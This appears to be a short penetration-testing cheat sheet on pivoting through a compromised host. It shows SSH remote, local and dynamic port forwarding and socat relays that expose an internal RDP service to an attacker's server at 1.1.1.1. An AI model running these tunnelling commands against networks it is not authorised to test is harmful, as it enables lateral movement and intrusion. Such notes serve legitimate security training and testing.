# Port Forwarding

### SSH Tunnelling

```batch
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluse
```

### SSH Remote Port Forwarding

If the attacker has previously compromised PC-1 and, in turn, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. **Remote port forwarding** allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a **remote** SSH server (the attacker's machine)

```batch
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

### SSH Local Port Forwarding

**Local port forwarding** allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host

```batch
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

### Port Forwarding Using Socat&#x20;

```batch
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

### Dynamic Port Forwarding and SOCKS&#x20;

```batch
ssh tunneluser@1.1.1.1 -R 9050 -N
```
